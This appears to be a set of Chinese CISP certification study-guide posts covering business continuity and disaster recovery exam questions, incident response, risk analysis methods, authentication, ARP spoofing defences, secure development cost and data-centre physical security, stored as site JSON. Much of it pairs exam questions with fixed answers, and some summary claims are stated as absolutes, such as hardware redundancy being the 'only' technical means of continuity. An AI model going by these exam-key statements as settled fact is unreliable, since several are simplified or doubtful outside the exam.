多计划管理原则： 方面 要求 原因 相容性 各计划策略一致 避免冲突 独立性 可以保持独立 适应复杂组织 协调性 互相协调配合 整体有效性 灵活性 根据需要调整 适应变化 8.24 年度风险评估后的BCP工作 完成年度风险评估后关于业务持续计划应执行的工作： 组织已经完成了年度风险评估，关于业务持续计划组织应执行哪项工作？ 答案：回顾并评价业务持续计划是否恰当 💡 风险评估后的BCP回顾为什么需要回顾BCP： 🔍 评估计划适用性 组织每次的风险评估应回顾其业务持续计划 确认计划是否仍然适合当前风险环境 识别需要更新的地方 确保计划与风险评估结果一致 其他活动的时机： 对业务持续计划进行完整的演练 - 应该在计划被认为适合组织之后 对职员进行商业持续计划的培训 - 应该在计划被认为适合组织之后 将商业持续计划通报关键联络人 - 没有原因要通报业务持续计划联络人 风险评估与BCP的关系： 风险评估后的BCP管理流程： ├── 第一步：回顾BCP │ ├── 评估计划是否恰当 │ ├── 识别需要更新的内容 │ └── 确认与风险评估一致 ├── 第二步：更新BCP（如需要） │ ├── 根据新风险调整策略 │ ├── 更新恢复优先级 │ └── 修订应急程序 ├── 第三步：培训和演练 │ ├── 培训相关人员 │ ├── 进行桌面演练 │ └── 进行全面演练 └── 第四步：持续监控 ├── 跟踪风险变化 ├── 定期评估 └── 及时调整 8.25 灾难恢复计划的回顾频率 组织回顾信息系统灾难恢复计划的方式： 答案：周期性回顾并更新 💡 DRP回顾的最佳实践周期性回顾的重要性： 📅 适当的时间间隔 根据业务种类、系统和职员的变化情况，应在适当的时间间隔对计划进行回顾 否则，计划将会过期或不再适用 不同的环境适当的时间间隔是三个月或一年 计划应该得到正规的测试，但下次测试期间应根据组织的种类和信息系统的相对重要性来决定 其他选项的问题： 每半年演练一次 - 太具体，不够灵活 经首席执行官(CEO)认可 - 虽然灾难恢复计划应该得到高级管理层的批准，但不必要由CEO批准，可以由具有相等的或更恰当的其他执行官批准 与组织的所有部门负责人沟通 - 和整个组织的业务连续性计划一样，信息系统灾难恢复计划是技术文档且仅与相关人员沟通 DRP回顾触发因素： 触发因素 回顾频率 说明 业务变化 发生时 业务种类改变 系统变化 发生时 信息系统更新 人员变化 发生时 关键职员变动 定期回顾 3个月-1年 根据组织类型 8.26 灾难恢复计划的成本影响 相对于不存在灾难恢复计划，当前灾难恢复计划的成本对比： 答案：增加 💡 DRP的成本影响为什么成本会增加： 💰 额外费用 因为灾难恢复计划措施的额外费用，组织的正常运行费用在执行灾难恢复计划后将增加 比如，没有灾难期间的正常运行费用将高于没有灾难恢复计划的运行费用 这是为了获得灾难恢复能力而必须付出的代价 成本增加的来源： 备份设施和设备 冗余系统 定期测试和演练 人员培训 计划维护和更新 备份数据存储 DRP成本效益分析： 方面 无DRP 有DRP 差异 日常运营成本 低 高 增加 灾难发生时损失 极高 低 大幅减少 恢复时间 很长 短 大幅缩短 业务中断影响 严重 可控 显著改善 总体风险 高 低 降低 8.27 多个BCP计划的协调要求 根据组织BCP复杂程度建立多个计划时的必要要求： 根据组织业务连续性计划（BCP）的复杂程度，可以建立多个计划来满足业务连续和灾难恢复的各方面。 答案：每个计划和其它计划保持协调一致 💡 多计划协调的必要性协调一致的重要性： 🔗 互相协调而非整合 根据组织规模的大小、业务复杂性，可以建立多个计划来满足灾难恢复和业务连续运行的需要 这些计划并不一定要集成到一个计划中 但是计划之间要互相协调，为一个总的业务连续性策略服务 确定计划实施的顺序不太可行，因为计划的实施依赖于灾难的性质、重要性和恢复时间等 为什么其他选项不正确： 所有的计划要整合到一个计划中 - 对复杂组织不现实且不必要 每个计划和其他计划相互依赖 - 过度依赖会降低灵活性 指定所有计划实施的顺序 - 不可行，需根据灾难性质决定 多计划协调原则： 多个BCP计划的协调框架： ├── 总体策略层 │ ├── 统一的业务连续性策略 │ ├── 一致的恢复目标 │ └── 协调的资源分配 ├── 计划层 │ ├── 计划A（业务部门1） │ ├── 计划B（业务部门2） │ ├── 计划C（IT系统） │ └── 计划D（关键设施） ├── 协调机制 │ ├── 定期协调会议 │ ├── 统一的指挥结构 │ ├── 共享的资源池 │ └── 一致的通信协议 └── 灵活执行 ├── 根据灾难性质选择 ├── 根据影响范围调整 └── 根据恢复优先级排序 8.28 热站作为备份的优点 使用热站作为备份的优点： 答案：热站在短时间内可运作 💡 热站的特点热站的主要优势： ⚡ 快速恢复 热站通常在几小时就可运行 提供最快的恢复时间 适合关键业务系统 热站的局限： 费用高 - 使用热站是昂贵的 不适合长期 - 不可作为一个长远的解决办法 需要兼容 - 热站要求设备和系统软件与主站兼容，用来备份 备份站点对比： 站点类型 恢复时间 成本 兼容性要求 适用场景 热站 几小时 很高 必须兼容 关键系统 温站 几天 中等 需要兼容 重要系统 冷站 几周 低 基本环境 非关键系统 8.29 完成BIA后的下一步 完成业务影响分析（BIA）后的下一步业务持续性计划： 答案：制定恢复策略 💡 BCP制定的正确顺序为什么恢复策略是下一步： 📋 逻辑顺序 制定恢复策略是下一步的业务持续性计划的最佳选择 只有制定了这个策略之后，特色的计划才能被发展、测试和执行 BIA提供了基础信息，恢复策略将这些信息转化为行动方案 BCP制定的完整顺序： 业务影响分析（BIA）✅ 已完成 制定恢复策略 ✅ 下一步 制定针对性计划 实施业务持续性计划 测试和维护业务持续性计划 BCP制定流程： BCP制定完整流程： ├── 第一阶段：分析 │ ├── 风险评估 │ ├── 业务影响分析（BIA）✅ │ └── 确定关键业务和RTO&#x2F;RPO ├── 第二阶段：策略 │ ├── 制定恢复策略 ⬅️ 当前步骤 │ ├── 选择恢复方案 │ └── 确定资源需求 ├── 第三阶段：计划 │ ├── 制定详细计划 │ ├── 分配角色职责 │ └── 建立程序文档 ├── 第四阶段：实施 │ ├── 获得批准 │ ├── 配置资源 │ └── 培训人员 └── 第五阶段：测试维护 ├── 进行测试演练 ├── 评估效果 └── 持续更新 8.30 信息处理设施硬件更换后的首要任务 硬件更换后业务连续性流程经理的首要活动： 在信息处理设施（IPF）的硬件更换之后，业务连续性流程经理首先应该实施的活动是： 答案：更新信息资产清单 💡 为什么首先更新信息资产清单信息资产清单的关键作用： 📋 业务连续性和灾难恢复计划的基础 信息资产清单是业务连续性和灾难恢复计划的基础 灾备计划必须反映最新的信息系统架构 硬件更换后，系统配置已经改变 必须先更新清单，才能更新相关计划 正确的处理顺序： 更新信息资产清单 ✅ 第一步 基于新清单更新灾难恢复计划 验证与热门站点的兼容性 检查实施报告 进行灾难恢复计划的演练 其他选项为什么在后： 验证与热门站点的兼容性 - 需要基于更新后的清单 检查实施报告 - 管理任务，不是技术优先级 进行灾难恢复计划的演练 - 在更新计划后进行 硬件更换后的活动顺序： 顺序 活动 原因 负责人 1 更新信息资产清单 反映最新系统架构 业务连续性经理 2 更新灾难恢复计划 基于新的资产清单 应急团队 3 验证兼容性 确保备份站点可用 技术团队 4 检查实施报告 管理和文档 项目经理 5 进行演练 验证更新后的计划 全体成员 九、事件后总结 6.1 事后分析 事后分析的关键问题： 事后分析清单： ├── 事件回顾 │ ├── 事件是如何发生的？ │ ├── 为什么没有及时发现？ │ ├── 响应是否及时有效？ │ └── 造成了哪些影响？ ├── 根本原因 │ ├── 技术层面的原因 │ ├── 管理层面的原因 │ ├── 人员层面的原因 │ └── 流程层面的原因 ├── 改进措施 │ ├── 技术控制加强 │ ├── 流程优化 │ ├── 人员培训 │ └── 监控改进 └── 经验教训 ├── 成功的做法 ├── 需要改进的地方 ├── 最佳实践总结 └── 知识库更新 6.2 持续改进 改进循环： graph LR A[\"事件发生\"] --> B[\"响应处理\"] B --> C[\"事后分析\"] C --> D[\"改进措施\"] D --> E[\"实施改进\"] E --> F[\"监控效果\"] F --> A style A fill:#ffebee,stroke:#c62828 style B fill:#fff3e0,stroke:#f57c00 style C fill:#e3f2fd,stroke:#1976d2 style D fill:#f3e5f5,stroke:#7b1fa2 style E fill:#e8f5e9,stroke:#388e3d style F fill:#fce4ec,stroke:#c2185b 九、总结 信息安全事件管理的核心在于： 快速响应：建立高效的检测和响应机制 优先级明确：按照正确的顺序通知相关人员 团队协作：建立专业的事件响应团队 阶段明确：遵循标准的响应流程 计划完善：制定完整的应急响应计划 灵活执行：计划是指导而非僵化规定 持续改进：从每次事件中学习和改进 🎯 关键要点事件响应流程： 事件响应六阶段：准备→确认→遏制→根除→恢复→跟踪 遏制阶段：制止事态扩大 根除阶段：实施补救措施 恢复阶段：使系统或业务恢复运营（建立临时业务处理能力、修复原系统损害、恢复运行） 跟踪阶段：降低风险再次发生的可能性 避免造成更大损失是遏制阶段的工作，不是恢复阶段 通知机制： 组织内应急通知应主要采用电话方式（快速有效） 电子邮件、人员传达、公司OA效率较低 应急响应日常运行小组应该第一个得到通知（负责损害评估） 系统管理员和恢复协调员应第一时间通知 律师不被通知或最后才被通知 应急响应计划： 应急响应计划与应急响应相互补充与促进 应急响应不必完全依照计划执行，可根据情况调整 应急响应可能发现计划的不足 计划总则包括：编制目的、编制依据、适用范围、工作原则 角色职责不属于总则，属于组织体系部分 计划建立： 建立应急响应计划最重要的是获得管理层支持 第一步应该实施业务影响分析（BIA） 管理层拥有应急响应计划的批准权 业务影响分析： BIA的主要目的：识别影响组织运营持续性的事件 BIA确定关键系统和业务、恢复目标 确定潜在损失和影响是风险评估的工作，不是BIA 应急响应策略： 主要考虑：系统恢复能力等级、资源要求、费用 人员考虑不是主要因素 领导小组： 组长应由最高管理层担任 主要职责包括承诺支持、审批计划、监督执行 组织演练不是领导小组职责 应急响应流程顺序： 事件通告→事件评估→应急启动→应急处置→后期处置 测试、演练和培训： 业务或环境重大变更时应测试 至少每年测试一次 应急响应计划培训至少每年举办一次 应急计划至少每年进行一次正确性和完整性检查 建立专业的CSIRT团队 定期进行演练和培训 重视事后分析和持续改进 文档管理： 应急响应计划文档应分发给参与应急响应工作的所有人员 不应该分发给公司所有人员（有敏感性内容） 具有多份拷贝在不同的地点保存 由专人负责保存与分发 病毒响应： 发现病毒感染终端后，首先应该拔掉网线（隔离病毒源） 第一时间隔离可以防止病毒扩散 其他操作（判断性质、搜索方法、呼叫人员）都在隔离后进行 我国事件分级： 分为四级：特别重大事件、重大事件、较大事件、一般事件 考虑三个要素：信息系统的重要程度、系统损失、社会影响 业务损失不是主要考虑要素 校园网200台以内主机受影响属于一般事件 部分楼宇网络瘫痪、FTP及部分网站服务器不能响应属于较大事件 部分园区瘫痪、邮件计费服务器不能工作属于重大事件 整体瘫痪、全部DNS主WEB服务器不能工作、出口中断属于特别重大事件 业务连续性管理与灾难恢复： IT服务连续性管理目标是保障灾难性故障后能尽快恢复业务或仍能提供服务 未定义危机宣布会影响灾难恢复计划的执行 硬件更换后首先应更新信息资产清单（是BCP/DR的基础） 灾难恢复计划目标是减少恢复时间、降低恢复费用 地理分布组织最具成本效益的测试方式是预案测试 较低的RTO会导致更高的容灾成本 实施灾难恢复计划后下一步应进行纸面测试 DRP是技术方面的业务连续性计划 非关键系统最合理的恢复方案是冷站 业务连续性计划适当的测试方法是纸面测试 硬件冗余是提供持续运营的唯一技术手段 业务持续计划中最重要的发现是骨干网备份的缺失 站点协议中最重要的考虑是同时允许使用设施的订户数量 业务持续计划应以损耗的持续时间为基础 文件恢复需要前一天的备份文件和当前的交易磁带 BIA的主要目的是识别能够影响组织运营持续性的事件 💡 实践建议 制定详细的事件响应计划 建立24/7的监控和响应能力 定期进行应急演练 保持与外部支持机构的联系 建立完善的事件知识库 定期评估和更新响应流程","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"CISP","slug":"CISP","permalink":"https://neo01.com/tags/CISP/"}],"lang":"zh-CN"},{"title":"CISP学习指南：通信与操作安全（扩展）","slug":"2025/10/CISP-Communications-Operations-Security-Extended-zh-CN","date":"un33fin33","updated":"un33fin33","comments":true,"path":"/zh-CN/2025/10/CISP-Communications-Operations-Security-Extended/","permalink":"https://neo01.com/zh-CN/2025/10/CISP-Communications-Operations-Security-Extended/","excerpt":"深入解析CISP认证中的风险评估方法、身份认证机制、ARP欺骗防护和软件安全开发投入策略。","text":"本文是通信与操作安全学习指南的扩展内容，涵盖风险评估、身份认证、网络攻击防护和软件安全开发等重要主题。 一、风险评估方法 1.1 定量与定性风险分析 风险评估方法的选择： 不同的信息安全风险评估方法可能得到不同的风险评估结果，组织应根据实际情况选择适当的风险评估方法。 graph TB A[\"风险评估方法\"] B[\"定量风险分析\"] C[\"定性风险分析\"] A --> B A --> C B --> B1[\"财务数字评估\"] B --> B2[\"量化风险结果\"] B --> B3[\"客观性强\"] B --> B4[\"需要大量数据\"] C --> C1[\"经验判断\"] C --> C2[\"等级评估\"] C --> C3[\"主观性强\"] C --> C4[\"快速实施\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#fff3e0,stroke:#f57c00 🚨 常见错误认知错误说法：定量风险分析相比定性风险分析能得到准确的数值，所以在实际工作中应使用定量风险分析，而不应选择定性风险分析 ❌ 为什么这是错误的： 📊 定量分析的局限性 需要大量准确的历史数据 数据收集成本高、耗时长 某些风险难以量化 结果依赖于数据质量 ⚖️ 两种方法各有优势 定量分析：适合有充足数据、需要精确财务评估的场景 定性分析：适合快速评估、数据不足的场景 实际工作中常结合使用 应根据组织实际情况选择 定量与定性风险分析对比： 方面 定量风险分析 定性风险分析 结果形式 具体数值（如损失金额） 等级评估（高/中/低） 客观性 ✅ 更客观 ⚠️ 较主观 数据要求 需要大量准确数据 依赖经验判断 实施成本 高 低 实施时间 长 短 适用场景 财务决策、合规要求 快速评估、初步分析 依赖因素 历史数据、统计模型 团队素质、经验技能 💡 正确的理解定量风险分析（Quantitative Risk Analysis）： ✅ 特点 试图从财务数字上对安全风险进行评估 得出可以量化的风险分析结果 度量风险的可能性和损失量 更具客观性 定性风险分析（Qualitative Risk Analysis）： ✅ 特点 往往需要凭借分析者的经验和直觉进行 分析结果与风险评估团队的素质、经验和知识技能密切相关 更具主观性 实施快速、成本低 实际应用建议： 根据组织实际情况选择方法 可以先定性后定量 可以结合使用两种方法 没有绝对的优劣之分 风险评估方法选择决策树： 选择风险评估方法： ├── 是否有充足的历史数据？ │ ├── 是 → 考虑定量分析 │ └── 否 → 选择定性分析 ├── 是否需要精确的财务数据？ │ ├── 是 → 倾向定量分析 │ └── 否 → 定性分析即可 ├── 时间和预算是否充足？ │ ├── 是 → 可以选择定量分析 │ └── 否 → 选择定性分析 ├── 团队是否有丰富经验？ │ ├── 是 → 定性分析可靠 │ └── 否 → 需要定量分析支持 └── 建议：结合使用两种方法 ├── 第一阶段：定性分析（快速识别） └── 第二阶段：定量分析（重点深入） 二、身份认证机制 2.1 单向鉴别与双向鉴别 用户登录鉴别过程分析： 某信息系统的用户登录过程： 用户通过HTTP协议访问信息系统 用户在登录页面输入用户名和口令 信息系统在服务器端检查用户名和密码的正确性，如果正确，则鉴别完成 这个鉴别过程属于：单向鉴别 sequenceDiagram participant U as 用户 participant S as 服务器 U->>S: 1. HTTP访问 S->>U: 2. 返回登录页面 U->>S: 3. 提交用户名和密码 S->>S: 4. 验证凭证 S->>U: 5. 返回结果（成功/失败） Note over U,S: 仅服务器验证用户身份用户未验证服务器身份属于单向鉴别 💡 单向鉴别的特征为什么是单向鉴别： 🔐 仅验证一方身份 服务器验证用户的身份（用户名和密码） 用户没有验证服务器的身份 用户无法确认服务器是否是真实的 存在钓鱼攻击风险 ⚠️ 安全风险 用户可能连接到伪造的服务器 容易遭受中间人攻击 凭证可能被窃取 无法防止钓鱼网站 不同鉴别方式对比： 鉴别方式 验证方向 安全性 应用场景 示例 单向鉴别 服务器验证客户端 ⚠️ 中 一般Web应用 HTTP基本认证 双向鉴别 双方互相验证 ✅ 高 高安全要求 HTTPS双向认证 三向鉴别 三次握手验证 ✅ 高 防重放攻击 Kerberos 第三方鉴别 通过可信第三方 ✅ 高 单点登录 OAuth、SAML 单向鉴别改进方案： 提升单向鉴别安全性： ├── 使用HTTPS │ ├── 服务器提供SSL&#x2F;TLS证书 │ ├── 客户端验证证书有效性 │ ├── 加密传输通道 │ └── 防止中间人攻击 ├── 实施双向认证 │ ├── 服务器验证客户端证书 │ ├── 客户端验证服务器证书 │ ├── 双方身份确认 │ └── 更高安全保障 ├── 增加多因素认证 │ ├── 密码 + 短信验证码 │ ├── 密码 + 动态令牌 │ ├── 密码 + 生物识别 │ └── 提高账户安全性 └── 实施安全监控 ├── 异常登录检测 ├── IP地址白名单 ├── 登录频率限制 └── 安全审计日志 三、网络攻击与防护 3.1 ARP欺骗原理与防范 ARP欺骗攻击机制： graph TB A[\"正常ARP通信\"] B[\"ARP欺骗攻击\"] A --> A1[\"主机A请求主机B的MAC地址\"] A1 --> A2[\"主机B响应真实MAC地址\"] A2 --> A3[\"主机A更新ARP缓存\"] A3 --> A4[\"正常通信\"] B --> B1[\"攻击者发送伪造ARP应答\"] B1 --> B2[\"受害者接收错误MAC地址\"] B2 --> B3[\"受害者更新ARP缓存\"] B3 --> B4[\"流量被重定向到攻击者\"] style A fill:#c8e6c9,stroke:#2e7d32 style B fill:#ffcdd2,stroke:#b71c1c 🚨 关于ARP欺骗的错误理解错误说法：彻底解决ARP欺骗的方法是避免使用ARP协议和ARP缓存，直接采用IP地址和其他主机进行连接 ❌ 为什么这是错误的： 🔧 ARP协议的必要性 ARP协议是TCP/IP协议栈的基础组件 以太网通信必须使用MAC地址 IP地址需要通过ARP解析为MAC地址 无法直接用IP地址进行以太网通信 ⚠️ 技术上不可行 以太网帧必须包含MAC地址 网卡只识别MAC地址 不使用ARP就无法进行局域网通信 这不是一个可行的解决方案 ARP欺骗正确理解： 💡 ARP欺骗的正确认知✅ 正确的理解： A. ARP欺骗原理 攻击者直接向受害者主机发送错误的ARP应答报文 使得受害者主机将错误的硬件地址映射关系存入ARP缓存 从而起到冒充主机的目的 B. 攻击范围限制 单纯利用ARP欺骗攻击时，通常影响内部子网 不能跨越路由实施攻击 ARP是数据链路层协议，不跨越三层设备 C. 有效防范方法 采用&quot;静态&quot;的ARP缓存 如果发生硬件地址更改，需要人工更新缓存 虽然管理成本高，但能有效防止ARP欺骗 ARP欺骗防范措施： 防范措施 有效性 实施难度 适用场景 静态ARP绑定 ✅ 高 高 关键服务器 ARP防火墙 ✅ 高 中 终端防护 交换机端口安全 ✅ 高 中 网络设备 VLAN隔离 🟡 中 中 网络分段 动态ARP检测(DAI) ✅ 高 低 企业网络 IP源防护(IPSG) ✅ 高 低 企业网络 ARP欺骗防护实施方案： ARP欺骗综合防护方案： ├── 网络层防护 │ ├── 启用动态ARP检测(DAI) │ ├── 配置IP源防护(IPSG) │ ├── 实施VLAN隔离 │ └── 配置端口安全 ├── 主机层防护 │ ├── 关键服务器使用静态ARP │ ├── 安装ARP防火墙软件 │ ├── 定期检查ARP缓存 │ └── 监控异常ARP流量 ├── 管理层防护 │ ├── 制定ARP管理策略 │ ├── 定期安全审计 │ ├── 人员安全培训 │ └── 应急响应预案 └── 监控层防护 ├── 部署ARP监控工具 ├── 实时告警机制 ├── 日志分析审计 └── 异常行为检测 四、软件安全开发 4.1 软件安全投入时机 软件开发阶段安全投入的经济性分析： 某单位准备开发业务软件，关于安全投入时机产生分歧： 开发部门：开发完成后发现问题再解决，成本更低 信息中心：应在开发阶段投入，后期解决代价太大 正确答案：信息中心的考虑是正确的，在软件立项阶段投入解决软件安全问题，总体经费投入比软件运行后的费用要低 graph TB A[\"软件生命周期\"] B[\"需求分析阶段\"] C[\"设计阶段\"] D[\"开发阶段\"] E[\"测试阶段\"] F[\"运行维护阶段\"] A --> B B --> C C --> D D --> E E --> F B --> B1[\"修复成本：1x\"] C --> C1[\"修复成本：5x\"] D --> D1[\"修复成本：10x\"] E --> E1[\"修复成本：20x\"] F --> F1[\"修复成本：100x\"] style B fill:#c8e6c9,stroke:#2e7d32 style C fill:#fff3e0,stroke:#f57c00 style D fill:#ffccbc,stroke:#d84315 style E fill:#ffcdd2,stroke:#c62828 style F fill:#d32f2f,stroke:#b71c1c,color:#fff 💡 软件安全成本倍增规律为什么早期投入成本更低： 📊 成本倍增效应 需求阶段发现问题：修复成本 = 1x 设计阶段发现问题：修复成本 = 5x 开发阶段发现问题：修复成本 = 10x 测试阶段发现问题：修复成本 = 20x 运行阶段发现问题：修复成本 = 100x 🔧 后期修复的额外成本 需要重新设计架构 大量代码需要重写 回归测试工作量大 可能影响已上线业务 用户数据迁移成本 声誉损失难以估量 早期安全投入的优势： 阶段 安全活动 成本 效果 需求分析 安全需求分析、威胁建模 很低 从源头避免安全问题 设计阶段 安全架构设计、安全评审 低 建立安全基础 开发阶段 安全编码、代码审查 中 减少安全缺陷 测试阶段 安全测试、渗透测试 中高 发现残留问题 运行阶段 漏洞修复、应急响应 极高 被动补救 软件安全开发生命周期(SSDLC)： 安全开发生命周期最佳实践： ├── 需求阶段 │ ├── 识别安全需求 │ ├── 威胁建模分析 │ ├── 合规性要求 │ └── 安全目标定义 ├── 设计阶段 │ ├── 安全架构设计 │ ├── 安全控制设计 │ ├── 数据保护设计 │ └── 安全设计评审 ├── 开发阶段 │ ├── 安全编码规范 │ ├── 代码安全审查 │ ├── 静态代码分析 │ └── 第三方组件审查 ├── 测试阶段 │ ├── 安全功能测试 │ ├── 漏洞扫描 │ ├── 渗透测试 │ └── 模糊测试 ├── 部署阶段 │ ├── 安全配置 │ ├── 加固部署 │ ├── 安全基线检查 │ └── 上线安全评估 └── 运维阶段 ├── 安全监控 ├── 漏洞管理 ├── 应急响应 └── 持续改进 ⚠️ 后期修复的隐性成本运行阶段修复安全问题的代价： 💰 直接成本 紧急修复开发成本 测试验证成本 部署实施成本 系统停机损失 📉 间接成本 用户信任度下降 品牌声誉受损 客户流失 法律合规风险 监管处罚 竞争力削弱 ⏰ 时间成本 应急响应时间 问题定位时间 修复开发时间 测试验证时间 部署上线时间 投资回报率(ROI)分析： 投入时机 投入成本 修复成本 总成本 ROI 需求阶段 10万 5万 15万 ✅ 最优 设计阶段 5万 25万 30万 🟡 良好 开发阶段 3万 50万 53万 ⚠️ 一般 测试阶段 2万 100万 102万 ❌ 较差 运行阶段 0万 500万+ 500万+ ❌ 最差 总结 通信与操作安全扩展知识的核心在于： 风险评估：根据实际情况选择定量或定性方法，两者各有优势 身份鉴别：理解单向、双向、三向鉴别的区别和应用场景 网络防护：ARP协议不可避免，需采取综合防护措施 安全开发：早期投入安全成本远低于后期修复 🎯 关键要点 定量和定性风险分析应根据实际情况选择，不存在绝对优劣 定量分析更客观但成本高，定性分析更快速但较主观 HTTP基本认证属于单向鉴别，存在钓鱼攻击风险 ARP协议是以太网通信的基础，无法避免使用 静态ARP绑定、DAI、IPSG是有效的ARP欺骗防范措施 软件安全问题在需求阶段修复成本最低 运行阶段修复成本可能是需求阶段的100倍以上 早期安全投入具有最佳投资回报率","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"CISP","slug":"CISP","permalink":"https://neo01.com/tags/CISP/"}],"lang":"zh-CN"},{"title":"CISP学习指南：物理与环境安全","slug":"2025/10/CISP-Physical-Environmental-Security-zh-CN","date":"un33fin33","updated":"un33fin33","comments":true,"path":"/zh-CN/2025/10/CISP-Physical-Environmental-Security/","permalink":"https://neo01.com/zh-CN/2025/10/CISP-Physical-Environmental-Security/","excerpt":"深入解析CISP认证中的物理与环境安全知识点，涵盖数据中心选址、物理访问控制和环境安全管理。","text":"物理与环境安全是信息安全的基础，再强大的逻辑安全措施也无法抵御物理层面的威胁。合理的物理安全设计是保护信息资产的第一道防线。 一、数据中心选址 1.1 楼层选择原则 在多层楼房中选择数据中心位置时，需要综合考虑多种安全因素。 各楼层风险分析： graph LR A[\"数据中心楼层选择\"] B[\"一楼\"] C[\"地下室\"] D[\"顶楼\"] E[\"中间楼层\"] A --> B A --> C A --> D A --> E B --> B1[\"❌ 高风险\"] B --> B2[\"易受外部入侵\"] B --> B3[\"洪水风险\"] B --> B4[\"车辆冲撞风险\"] C --> C1[\"❌ 极高风险\"] C --> C2[\"洪水、渗水\"] C --> C3[\"通风散热困难\"] C --> C4[\"逃生困难\"] D --> D1[\"❌ 高风险\"] D --> D2[\"屋顶漏水\"] D --> D3[\"雷击风险\"] D --> D4[\"承重问题\"] E --> E1[\"✅ 最佳选择\"] E --> E2[\"物理隔离好\"] E --> E3[\"环境稳定\"] E --> E4[\"便于管理\"] style B fill:#ffebee,stroke:#c62828 style C fill:#ffcdd2,stroke:#b71c1c style D fill:#ffebee,stroke:#c62828 style E fill:#c8e6c9,stroke:#2e7d32 楼层风险对比： 楼层位置 主要风险 风险等级 是否推荐 地下室 洪水、渗水、通风、逃生 ⭐⭐⭐⭐⭐ 极高 ❌ 不推荐 一楼 外部入侵、洪水、车辆冲撞 ⭐⭐⭐⭐ 高 ❌ 不推荐 顶楼 屋顶漏水、雷击、承重 ⭐⭐⭐⭐ 高 ❌ 不推荐 中间楼层 相对较少 ⭐⭐ 低 ✅ 推荐 💡 最佳选择：中间楼层为什么中间楼层最适合： 🏢 物理隔离 上下都有楼层作为缓冲 不易受外部直接攻击 减少环境因素影响 💧 水患防护 避免地面洪水 避免屋顶漏水 减少管道渗漏影响 ⚡ 环境稳定 温度相对稳定 避免雷击风险 承重压力适中 🚪 访问控制 便于设置多层访问控制 不易被外部直接观察 逃生路线充足 1.2 数据中心选址的其他考虑因素 地理位置因素： 选址考虑清单： ├── 自然灾害风险 │ ├── 地震带 │ ├── 洪水区 │ ├── 台风路径 │ └── 地质稳定性 ├── 基础设施 │ ├── 电力供应稳定性 │ ├── 网络连接质量 │ ├── 交通便利性 │ └── 应急服务可达性 ├── 周边环境 │ ├── 远离化工厂 │ ├── 远离机场（电磁干扰） │ ├── 远离军事设施 │ └── 避开高犯罪率区域 └── 法律法规 ├── 数据主权要求 ├── 隐私保护法规 └── 行业合规要求 二、物理访问控制 2.1 分层防护模型 数据中心应采用多层物理访问控制，形成纵深防御。 graph TB A[\"外围边界\"] B[\"建筑入口\"] C[\"楼层入口\"] D[\"机房入口\"] E[\"机柜\"] A --> B B --> C C --> D D --> E A --> A1[\"围墙、栅栏监控摄像头\"] B --> B1[\"门禁系统保安值守\"] C --> C1[\"电梯控制楼层门禁\"] D --> D1[\"生物识别双人认证\"] E --> E1[\"机柜锁资产标签\"] style A fill:#e3f2fd,stroke:#1976d2 style B fill:#f3e5f5,stroke:#7b1fa2 style C fill:#e8f5e9,stroke:#388e3d style D fill:#fff3e0,stroke:#f57c00 style E fill:#fce4ec,stroke:#c2185b 各层控制措施： 防护层 控制措施 目的 外围边界 围墙、监控、巡逻 阻止未授权进入园区 建筑入口 门禁、保安、访客登记 控制进入建筑物 楼层入口 电梯控制、楼层门禁 限制楼层访问 机房入口 生物识别、双人认证 严格控制机房访问 机柜 机柜锁、资产管理 保护具体设备 2.2 访问控制技术 常用技术对比： 技术类型 安全性 便利性 成本 适用场景 钥匙 ⭐⭐ ⭐⭐⭐ 低 低安全区域 门禁卡 ⭐⭐⭐ ⭐⭐⭐⭐ 中 一般办公区域 PIN码 ⭐⭐⭐ ⭐⭐⭐⭐ 低 辅助认证 生物识别 ⭐⭐⭐⭐⭐ ⭐⭐⭐⭐ 高 高安全区域 双因素认证 ⭐⭐⭐⭐⭐ ⭐⭐⭐ 高 核心机房 三、环境安全管理 3.1 温湿度控制 数据中心环境要求： (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_ed37eaf33')); var option = { \"title\": { \"text\": \"数据中心温湿度标准范围\" }, \"tooltip\": { \"trigger\": \"axis\" }, \"legend\": { \"data\": [\"温度范围\", \"湿度范围\"] }, \"xAxis\": { \"type\": \"category\", \"data\": [\"最低值\", \"推荐下限\", \"理想值\", \"推荐上限\", \"最高值\"] }, \"yAxis\": [ { \"type\": \"value\", \"name\": \"温度 (°C)\", \"min\": 15, \"max\": 30 }, { \"type\": \"value\", \"name\": \"湿度 (%)\", \"min\": 30, \"max\": 70 } ], \"series\": [ { \"name\": \"温度范围\", \"type\": \"line\", \"data\": [18, 20, 22, 25, 27], \"itemStyle\": {\"color\": \"#f44336\"} }, { \"name\": \"湿度范围\", \"type\": \"line\", \"yAxisIndex\": 1, \"data\": [40, 45, 50, 55, 60], \"itemStyle\": {\"color\": \"#2196f3\"} } ] }; chart.setOption(option); } })(); 环境参数标准： 参数 理想值 可接受范围 超出影响 温度 22°C 18-27°C 设备过热或结露 湿度 50% 40-60% 静电或腐蚀 洁净度 ISO 8级 - 设备故障 噪音 &lt;65dB &lt;75dB 人员健康 3.2 电力保障 电力系统架构： graph TB A[\"市电\"] B[\"备用发电机\"] C[\"UPS系统\"] D[\"配电系统\"] E[\"IT设备\"] A --> C B --> C C --> D D --> E A --> A1[\"主要电源\"] B --> B1[\"应急电源自动切换\"] C --> C1[\"不间断电源电池后备\"] D --> D1[\"双路供电负载均衡\"] style A fill:#4caf50,stroke:#2e7d32 style B fill:#ff9800,stroke:#e65100 style C fill:#2196f3,stroke:#1565c0 style D fill:#9c27b0,stroke:#6a1b9a style E fill:#e3f2fd,stroke:#1976d2 电力保障措施： ✅ 多路市电接入：避免单点故障 ✅ UPS系统：提供短期电力保障 ✅ 备用发电机：长时间停电应对 ✅ 定期测试：确保应急系统可用 ✅ 电力监控：实时监测电力质量 3.3 消防安全 数据中心消防系统： 系统类型 特点 适用场景 气体灭火 不损坏设备，环保 机房核心区域 水喷淋 成本低，效果好 办公区域 烟雾探测 早期预警 所有区域 温度探测 火灾确认 所有区域 ⚠️ 数据中心消防特殊要求不能使用水基灭火系统的原因： 💧 水会损坏电子设备 ⚡ 导电，造成短路 💾 破坏数据存储介质 推荐使用： ✅ 气体灭火系统（如FM-200、七氟丙烷） ✅ 惰性气体系统（如IG-541） ✅ 早期烟雾探测系统 四、物理安全监控 4.1 监控系统 